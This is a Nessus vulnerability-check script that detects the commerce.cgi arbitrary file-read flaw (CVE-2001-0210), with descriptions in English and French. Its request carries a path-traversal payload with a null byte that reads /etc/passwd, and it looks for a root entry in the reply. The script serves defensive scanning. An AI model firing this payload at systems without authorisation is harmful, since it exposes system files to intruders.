#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10612);
 script_bugtraq_id(2361);
 script_version ("$Revision: 1.16 $");
 script_cve_id("CVE-2001-0210");
 
 name["english"] = "commerce.cgi";
 name["francais"] = "commerce.cgi";

 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The 'commerce.cgi' CGI is installed. This CGI has
a well known security flaw that lets an attacker read arbitrary files
with the privileges of the http daemon (usually root or nobody).

Solution : remove it from /cgi-bin.

Risk factor : High";


 desc["francais"] = "Le cgi 'commerce.cgi' est installé. Celui-ci possède
un problème de sécurité bien connu qui permet à n'importe qui de faire
lire des fichiers arbitraires au daemon http, avec les privilèges
de celui-ci (root ou nobody). 

Solution : retirez-le de /cgi-bin.

Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the presence of /cgi-bin/commerce.cgi";
 summary["francais"] = "Vérifie la présence de /cgi-bin/commerce.cgi";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);


foreach dir (cgi_dirs())
{
 req = http_get(item:string(dir , "/commerce.cgi?page=../../../../../etc/passwd%00index.html"),
	       port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL ) exit(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
 	{
	security_hole(port);
	exit(0);
	}
}
